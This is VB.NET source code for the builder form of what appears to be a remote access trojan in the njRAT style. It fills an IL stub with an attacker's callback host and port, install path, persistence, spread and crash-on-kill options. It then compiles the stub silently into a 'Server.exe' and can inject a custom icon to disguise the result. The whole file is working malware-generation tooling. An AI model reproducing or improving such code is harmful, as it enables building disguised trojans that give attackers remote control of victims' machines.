Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Public Class Builder
    Inherits Form
    ' Methods
    Private string_0 As String
    Public Sub New()
        Me.string_0 = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Icon = My.Resources.Icon
        Me.dir.SelectedIndex = 0
        Me.host.Text = Class6.smethod_2("host", Me.host.Text)
        Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
        Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
        Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
        Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
        Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString))
        Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString))
        Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString))
        Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString))
        Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString))
        Me.string_0 = Class6.smethod_2("ico", String.Empty)
        If Not File.Exists(Me.string_0) Then
            Me.string_0 = String.Empty
        End If
        If (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))) Then
            Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
        End If
        Try
            If (Me.string_0 <> String.Empty) Then
                Me.PictureBox1.Image = New Icon(Class6.smethod_2("ico", String.Empty)).ToBitmap
                Me.CheckBox1.Checked = True
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.string_0 = String.Empty
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim dialog As New SaveFileDialog With { _
              .Filter = "EXE|*.exe", _
              .FileName = "Server" _
          }
        If (dialog.ShowDialog = DialogResult.OK) Then
            If Not Me.CheckBox1.Checked Then
                Me.string_0 = Nothing
            End If
            If File.Exists(dialog.FileName) Then
                File.Delete(dialog.FileName)
            End If
            Dim contents As String = File.ReadAllText((Application.StartupPath & "\Stub.il"))
            Dim newValue As String = Class6.smethod_4(String.Concat(New String() {Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString, Me.Idr.Checked.ToString, Me.Isu.Checked.ToString, Me.Isf.Checked.ToString}))
            Dim box As TextBox = Me.VN
            Dim text As String = box.Text
            box.Text = [text]
            contents = contents.Replace("[VN]", Class6.smethod_14([text])).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString).Replace("[Isu]", Me.Isu.Checked.ToString).Replace("[Isf]", Me.Isf.Checked.ToString).Replace("[klen]", Me.klen.Value.ToString)
            File.WriteAllText((Interaction.Environ("temp") & "\stub.il"), contents)
            Dim startInfo As New ProcessStartInfo With { _
                .FileName = (Interaction.Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe"), _
                .CreateNoWindow = True, _
                .WindowStyle = ProcessWindowStyle.Hidden, _
                .Arguments = String.Concat(New String() {"/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", dialog.FileName, """"}) _
            }
            Process.Start(startInfo).WaitForExit()
            If ((Not Me.string_0 Is Nothing) AndAlso File.Exists(Me.string_0)) Then
                IconN.InjectIcon(dialog.FileName, Me.string_0)
            End If
            Dim ptr As IntPtr = GClass2.BeginUpdateResource(dialog.FileName, False)
            Dim buffer As Byte() = File.ReadAllBytes((Application.StartupPath & "\Stub.manifest"))
            GClass2.UpdateResource(ptr, CType(24, IntPtr), CType(1, IntPtr), 0, buffer, buffer.Length)
            GClass2.EndUpdateResource(ptr, False)
            Class6.smethod_3("host", Me.host.Text)
            Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
            Class6.smethod_3("exe", Me.exe.Text)
            Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
            Class6.smethod_3("vn", Me.VN.Text)
            Class6.smethod_3("bsod", Me.bsod.Checked.ToString)
            Class6.smethod_3("ico", Me.string_0)
            Class6.smethod_3("Idr", Me.Idr.Checked.ToString)
            Class6.smethod_3("Isu", Me.Isu.Checked.ToString)
            Class6.smethod_3("Isf", Me.Isf.Checked.ToString)
            Class6.smethod_3("klen", Me.klen.Value.ToString)
            Interaction.MsgBox(dialog.FileName, MsgBoxStyle.ApplicationModal, "DONE!")
            Me.Close()
        End If

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked Then
            If (Me.PictureBox1.Image Is Nothing) Then
                Dim dialog As New OpenFileDialog With { _
                    .Filter = "Icon|*.ico", _
                    .Title = "Choose Icon", _
                    .FileName = String.Empty _
                }
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.string_0 = dialog.FileName
                    Me.PictureBox1.Image = Image.FromFile(Me.string_0)
                End If
            End If
        Else
            Me.PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs) Handles Idr.CheckedChanged
        If Not Me.Idr.Checked Then
            If (Me.exe.Text = String.Empty) Then
                Me.exe.Text = "server.exe"
            End If
            Me.exe.Enabled = False
            Me.dir.Enabled = False
        Else
            Me.exe.Enabled = True
            Me.dir.Enabled = True
        End If
    End Sub
End Class